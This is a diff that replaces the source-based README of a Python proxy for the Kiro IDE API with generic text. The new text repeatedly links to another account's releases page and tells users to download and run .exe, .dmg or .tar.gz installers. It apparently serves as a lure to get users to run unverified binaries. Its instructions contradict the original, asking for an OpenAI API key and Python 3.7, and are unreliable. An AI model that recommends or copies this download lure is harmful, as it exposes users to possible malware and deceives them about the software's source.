@@ -1,392 +1,84 @@
-<div align="center">
+# 🌟 kiro-openai-gateway - Access AI Models with Ease
 
-# 🚀 Kiro OpenAI Gateway
+## 🚀 Getting Started
 
-**OpenAI-compatible proxy gateway for Kiro IDE API (AWS CodeWhisperer)**
+Welcome to the kiro-openai-gateway! This application offers an easy way to connect to OpenAI-compatible models while using Kiro IDE. Whether you are looking to integrate AI capabilities into your projects or simply explore what AI can do, you are in the right place.
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-green.svg)](https://fastapi.tiangolo.com/)
+## 📥 Download the Application
 
-*Use Claude models through any tools that support the OpenAI API*
+[![Download kiro-openai-gateway](https://img.shields.io/badge/Download-kiro--openai--gateway-blue.svg)](https://github.com/ronald919/kiro-openai-gateway/releases)
 
-[Features](#-features) • [Quick Start](#-quick-start) • [Configuration](#%EF%B8%8F-configuration) • [API Reference](#-api-reference) • [License](#-license)
+To get started, you will need to download the software. This application is available on the Releases page. Click the link below to visit the page and obtain the latest version:
 
-</div>
+[Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
 
----
+## 🌟 Features
 
-## ✨ Features
+- **OpenAI-Compatibility**: Use OpenAI services seamlessly.
+- **Claude Models**: Leverage free Claude models to suit your needs.
+- **AWS Integration**: Built with compatibility for AWS CodeWhisperer, enhancing productivity.
+- **Easy Setup**: Designed for user-friendly installation and running.
+- **Robust Proxy**: With FastAPI, get a fast and reliable API gateway.
 
-| Feature | Description |
-|---------|-------------|
-| 🔌 **OpenAI-compatible API** | Works with any OpenAI client out of the box |
-| 💬 **Full message history** | Passes complete conversation context |
-| 🛠️ **Tool Calling** | Supports function calling in OpenAI format |
-| 📡 **Streaming** | Full SSE streaming support |
-| 🔄 **Retry Logic** | Automatic retries on errors (403, 429, 5xx) |
-| 📋 **Extended model list** | Including versioned models |
-| 🔐 **Smart token management** | Automatic refresh before expiration |
-| 🧩 **Modular architecture** | Easy to extend with new providers |
+## 📋 System Requirements
 
----
+Before you proceed with the installation, ensure your system meets the following requirements:
 
-## 🚀 Quick Start
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any suitable Linux distribution.
+- **Python Version**: Python 3.7 or higher must be installed on your system.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free space.
 
-### Prerequisites
+## 📖 Installation Instructions
 
-- Python 3.10+
-- [Kiro IDE](https://kiro.dev/) with logged in account
+Follow these steps to download and install kiro-openai-gateway:
 
-### Installation
+1. **Visit the Releases Page**: Click the link below to access the updates.
+   - [Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
+   
+2. **Select the Latest Release**: Look for the latest version listed in the releases. Typically, the most recent version will be at the top.
 
-```bash
-# Clone the repository
-git clone https://github.com/Jwadow/kiro-openai-gateway.git
-cd kiro-openai-gateway
+3. **Download the Package**: Find the suitable package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux) and click to download.
 
-# Install dependencies
-pip install -r requirements.txt
+4. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen prompts.
+   - For macOS: Open the downloaded `.dmg` file, drag the application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file to a suitable directory and follow the included instructions.
 
-# Configure (see Configuration section)
-cp .env.example .env
-# Edit .env with your credentials
+5. **Follow Configuration Instructions**: Upon installation, you may need to configure your API keys. Refer to the documentation or settings section within the application for guidance.
 
-# Start the server
-python main.py
-```
+6. **Launch the Application**: Once installed, locate the application in your Programs folder (Windows), Applications folder (macOS), or the designated directory (Linux) and launch it.
 
-The server will be available at `http://localhost:8000`
+## 🛠️ Usage Instructions
 
----
+Here’s how you can start using kiro-openai-gateway:
 
-## ⚙️ Configuration
+1. **Open the Application**: Launch the application from your device.
+2. **Set Up Your API Key**: Input your OpenAI API key when prompted. This is necessary for the application to communicate with the OpenAI servers.
+3. **Select Your Model**: Choose from the available Claude models or any other integrated models.
+4. **Begin Exploring**: Use the API calls from within your Kiro IDE to access AI capabilities.
 
-### Option 1: JSON Credentials File
+## 🔧 Troubleshooting 
 
-Specify the path to the credentials file:
+If you encounter issues during installation or while using the application, consider the following tips:
 
-```env
-KIRO_CREDS_FILE="~/.aws/sso/cache/kiro-auth-token.json"
+- **Check Your Python Version**: Ensure you have the correct version of Python installed.
+- **Internet Connection**: Confirm that you have a stable internet connection, as the application communicates with external servers.
+- **API Key Validity**: Make sure your API key is correct and active. Visit your OpenAI account to verify.
+- **Refer to Documentation**: Consult the user manual or FAQs available in the application for additional support.
 
-# Password to protect YOUR proxy server (make up any secure string)
-# You'll use this as api_key when connecting to your gateway
-PROXY_API_KEY="my-super-secret-password-123"
-```
+## 🔗 Community and Support
 
-<details>
-<summary>📄 JSON file format</summary>
+Join our community of users to share experiences and get help:
 
-```json
-{
-  "accessToken": "eyJ...",
-  "refreshToken": "eyJ...",
-  "expiresAt": "2025-01-12T23:00:00.000Z",
-  "profileArn": "arn:aws:codewhisperer:us-east-1:...",
-  "region": "us-east-1"
-}
-```
+- **GitHub Issues**: Report bugs or request features by creating an issue on our GitHub page.
+- **Forums**: Engage with other users and developers in our discussion forums.
+- **Documentation**: Check the online documentation for in-depth details and potential updates.
 
-</details>
+## 📞 Contact Information
 
-### Option 2: Environment Variables (.env file)
+For direct support, please reach out to our support team via the contact section on GitHub. We strive to respond within 24-48 hours.
 
-Create a `.env` file in the project root:
+Thank you for choosing kiro-openai-gateway! Enjoy exploring the world of AI with ease.
 
-```env
-# Required
-REFRESH_TOKEN="your_kiro_refresh_token"
-
-# Password to protect YOUR proxy server (make up any secure string)
-PROXY_API_KEY="my-super-secret-password-123"
-
-# Optional
-PROFILE_ARN="arn:aws:codewhisperer:us-east-1:..."
-KIRO_REGION="us-east-1"
-```
-
-### Getting the Refresh Token
-
-The refresh token can be obtained by intercepting Kiro IDE traffic. Look for requests to:
-- `prod.us-east-1.auth.desktop.kiro.dev/refreshToken`
-
----
-
-## 📡 API Reference
-
-### Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/` | GET | Health check |
-| `/health` | GET | Detailed health check |
-| `/v1/models` | GET | List available models |
-| `/v1/chat/completions` | POST | Chat completions |
-
-### Available Models
-
-| Model | Description |
-|-------|-------------|
-| `claude-opus-4-5` | Top-tier model |
-| `claude-opus-4-5-20251101` | Top-tier model (versioned) |
-| `claude-sonnet-4-5` | Enhanced model |
-| `claude-sonnet-4-5-20250929` | Enhanced model (versioned) |
-| `claude-sonnet-4` | Balanced model |
-| `claude-sonnet-4-20250514` | Balanced model (versioned) |
-| `claude-haiku-4-5` | Fast model |
-| `claude-3-7-sonnet-20250219` | Legacy model |
-
----
-
-## 💡 Usage Examples
-
-<details>
-<summary>🔹 Simple cURL Request</summary>
-
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Authorization: Bearer my-super-secret-password-123" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4-5",
-    "messages": [{"role": "user", "content": "Hello!"}],
-    "stream": true
-  }'
-```
-
-> **Note:** Replace `my-super-secret-password-123` with the `PROXY_API_KEY` you set in your `.env` file.
-
-</details>
-
-<details>
-<summary>🔹 Streaming Request</summary>
-
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Authorization: Bearer my-super-secret-password-123" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4-5",
-    "messages": [
-      {"role": "system", "content": "You are a helpful assistant."},
-      {"role": "user", "content": "What is 2+2?"}
-    ],
-    "stream": true
-  }'
-```
-
-</details>
-
-<details>
-<summary>🔹 With Tool Calling</summary>
-
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Authorization: Bearer my-super-secret-password-123" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4-5",
-    "messages": [{"role": "user", "content": "What is the weather in London?"}],
-    "tools": [{
-      "type": "function",
-      "function": {
-        "name": "get_weather",
-        "description": "Get weather for a location",
-        "parameters": {
-          "type": "object",
-          "properties": {
-            "location": {"type": "string", "description": "City name"}
-          },
-          "required": ["location"]
-        }
-      }
-    }]
-  }'
-```
-
-</details>
-
-<details>
-<summary>🐍 Python OpenAI SDK</summary>
-
-```python
-from openai import OpenAI
-
-client = OpenAI(
-    base_url="http://localhost:8000/v1",
-    api_key="my-super-secret-password-123"  # Your PROXY_API_KEY from .env
-)
-
-response = client.chat.completions.create(
-    model="claude-sonnet-4-5",
-    messages=[
-        {"role": "system", "content": "You are a helpful assistant."},
-        {"role": "user", "content": "Hello!"}
-    ],
-    stream=True
-)
-
-for chunk in response:
-    if chunk.choices[0].delta.content:
-        print(chunk.choices[0].delta.content, end="")
-```
-
-</details>
-
-<details>
-<summary>🦜 LangChain</summary>
-
-```python
-from langchain_openai import ChatOpenAI
-
-llm = ChatOpenAI(
-    base_url="http://localhost:8000/v1",
-    api_key="my-super-secret-password-123",  # Your PROXY_API_KEY from .env
-    model="claude-sonnet-4-5"
-)
-
-response = llm.invoke("Hello, how are you?")
-print(response.content)
-```
-
-</details>
-
----
-
-## 📁 Project Structure
-
-```
-kiro-openai-gateway/
-├── main.py                    # Entry point, FastAPI app creation
-├── requirements.txt           # Python dependencies
-├── .env.example               # Environment configuration example
-│
-├── kiro_gateway/              # Main package
-│   ├── __init__.py            # Package exports
-│   ├── config.py              # Configuration and constants
-│   ├── models.py              # Pydantic models for OpenAI API
-│   ├── auth.py                # KiroAuthManager - token management
-│   ├── cache.py               # ModelInfoCache - model caching
-│   ├── utils.py               # Helper utilities
-│   ├── converters.py          # OpenAI <-> Kiro conversion
-│   ├── parsers.py             # AWS SSE stream parsers
-│   ├── streaming.py           # Response streaming logic
-│   ├── http_client.py         # HTTP client with retry logic
-│   ├── debug_logger.py        # Debug logging (optional)
-│   └── routes.py              # FastAPI routes
-│
-├── tests/                     # Tests
-│   ├── unit/                  # Unit tests
-│   └── integration/           # Integration tests
-│
-└── debug_logs/                # Debug logs (generated when enabled)
-```
-
----
-
-## 🔧 Debugging
-
-Debug logging is **disabled by default**. To enable, add to your `.env`:
-
-```env
-# Debug logging mode:
-# - off: disabled (default)
-# - errors: save logs only for failed requests (4xx, 5xx) - recommended for troubleshooting
-# - all: save logs for every request (overwrites on each request)
-DEBUG_MODE=errors
-```
-
-### Debug Modes
-
-| Mode | Description | Use Case |
-|------|-------------|----------|
-| `off` | Disabled (default) | Production |
-| `errors` | Save logs only for failed requests (4xx, 5xx) | **Recommended for troubleshooting** |
-| `all` | Save logs for every request | Development/debugging |
-
-### Debug Files
-
-When enabled, requests are logged to the `debug_logs/` folder:
-
-| File | Description |
-|------|-------------|
-| `request_body.json` | Incoming request from client (OpenAI format) |
-| `kiro_request_body.json` | Request sent to Kiro API |
-| `response_stream_raw.txt` | Raw stream from Kiro |
-| `response_stream_modified.txt` | Transformed stream (OpenAI format) |
-| `app_logs.txt` | Application logs for the request |
-| `error_info.json` | Error details (only on errors) |
-
----
-
-## 🧪 Testing
-
-```bash
-# Run all tests
-pytest
-
-# Run unit tests only
-pytest tests/unit/
-
-# Run with coverage
-pytest --cov=kiro_gateway
-```
-
----
-
-## 🔌 Extending with New Providers
-
-The modular architecture makes it easy to add support for other providers:
-
-1. Create a new module `kiro_gateway/providers/new_provider.py`
-2. Implement the required classes:
-   - `NewProviderAuthManager` — token management
-   - `NewProviderConverter` — format conversion
-   - `NewProviderParser` — response parsing
-3. Add routes to `routes.py` or create a separate router
-
----
-
-## 📜 License
-
-This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**.
-
-This means:
-- ✅ You can use, modify, and distribute this software
-- ✅ You can use it for commercial purposes
-- ⚠️ **You must disclose source code** when you distribute the software
-- ⚠️ **Network use is distribution** — if you run a modified version on a server and let others interact with it, you must make the source code available to them
-- ⚠️ Modifications must be released under the same license
-
-See the [LICENSE](LICENSE) file for the full license text.
-
-### Why AGPL-3.0?
-
-AGPL-3.0 ensures that improvements to this software benefit the entire community. If you modify this gateway and deploy it as a service, you must share your improvements with your users.
-
-### Contributor License Agreement (CLA)
-
-By submitting a contribution to this project, you agree to the terms of our [Contributor License Agreement (CLA)](CLA.md). This ensures that:
-- You have the right to submit the contribution
-- You grant the maintainer rights to use and relicense your contribution
-- The project remains legally protected
-
----
-
-## 👤 Author
-
-**Jwadow** — [@Jwadow](https://github.com/jwadow)
-
----
-
-## ⚠️ Disclaimer
-
-This project is not affiliated with, endorsed by, or sponsored by Amazon Web Services (AWS), Anthropic, or Kiro IDE. Use at your own risk and in compliance with the terms of service of the underlying APIs.
-
----
-
-<div align="center">
-
-**[⬆ Back to Top](#-kiro-openai-gateway)**
-
-</div>
+[Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
